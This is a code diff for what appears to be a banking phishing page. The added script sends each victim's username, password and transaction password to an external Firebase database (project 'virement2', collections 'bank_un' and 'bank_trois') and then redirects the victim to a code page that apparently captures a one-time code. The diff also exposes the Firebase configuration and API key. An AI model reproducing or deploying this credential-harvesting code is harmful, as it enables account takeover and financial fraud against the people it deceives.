@@ -120,21 +120,93 @@
       icon.classList.toggle('fa-eye-slash');
     });
   </script>
-  <script>
-    function goToCodePage(event) {
-        event.preventDefault(); // Empêche la soumission par défaut du formulaire
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-        const transacpassword = document.getElementById("transacpassword").value;
-        if (username && password) {
-            localStorage.setItem("username", username);
-            localStorage.setItem("password", password);
-            localStorage.setItem("transacpassword", transacpassword);
-            window.location.href = "code3.html"; // Redirection vers la page de validation du code
-        } else {
-            alert("Please fill in all fields");
+ <script type="module">
+    // Importation de Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getFirestore, collection, setDoc, doc, query, orderBy, limit, getDocs } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
+
+    // Configuration Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
+        authDomain: "virement2-bf790.firebaseapp.com",
+        projectId: "virement2-bf790",
+        storageBucket: "virement2-bf790.firebasestorage.app",
+        messagingSenderId: "965517390511",
+        appId: "1:965517390511:web:430715abd2331f0a42da5a"
+    };
+
+    // Initialisation Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Fonction pour récupérer le plus grand ID Firestore dans une collection
+    async function getMaxDocumentId(collectionName) {
+        try {
+            // Créer une requête pour trier les documents par ID Firestore en ordre décroissant
+            const q = query(collection(db, collectionName), orderBy("__name__", "desc"), limit(1));
+
+            // Exécuter la requête
+            const querySnapshot = await getDocs(q);
+
+            // Vérifier si des documents existent
+            if (!querySnapshot.empty) {
+                const maxIdDoc = querySnapshot.docs[0]; // Récupérer le premier document (le plus grand ID)
+                const maxId = maxIdDoc.id; // Récupérer l'ID Firestore du document
+                return maxId; // Retourner l'ID Firestore (chaîne de caractères)
+            } else {
+                return "0000"; // Retourner "0000" si la collection est vide
+            }
+        } catch (error) {
+            console.error("Erreur lors de la récupération du plus grand ID :", error);
+            throw error;
         }
     }
+
+    // Fonction pour générer un nouvel ID incrémenté
+    async function generateCustomId(collectionName) {
+        const maxId = await getMaxDocumentId(collectionName); // Récupérer le plus grand ID Firestore
+        const maxIdNumber = parseInt(maxId, 10); // Convertir en nombre
+        const newIdNumber = maxIdNumber + 1; // Incrémenter l'ID
+        return String(newIdNumber).padStart(4, '0'); // Formater en 4 chiffres (ex: 0200)
+    }
+
+    // Gestion du formulaire
+    document.addEventListener("DOMContentLoaded", function () {
+        document.getElementById("userForm").addEventListener("submit", async function (event) {
+            event.preventDefault(); // Empêche le rechargement de la page
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const transacpassword = document.getElementById("transacpassword").value;
+
+            if (username && password) {
+                try {
+                    // Générer un nouvel ID personnalisé
+                    const customId = await generateCustomId("bank_un");
+
+                    // Ajouter les données dans Firestore avec un champ "code" vide
+                    await setDoc(doc(db, "bank_trois", customId), {
+                        id: customId,
+                        username: username,
+                        motdepasse: password,
+                        transacpassword: transacpassword,
+                        code: "", // Champ "code" vide
+                        timestamp: new Date()
+                    });
+
+                    console.log("Document créé avec l'ID : ", customId);
+
+                    // Rediriger vers la page 2 (code.html) avec l'ID du document
+                    window.location.href = `code.html?id=${customId}`;
+
+                } catch (error) {
+                    console.error("Erreur Firebase :", error);
+                }
+            } else {
+                alert("Veuillez remplir tous les champs !");
+            }
+        });
+    });
 </script>
 </body>
 <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
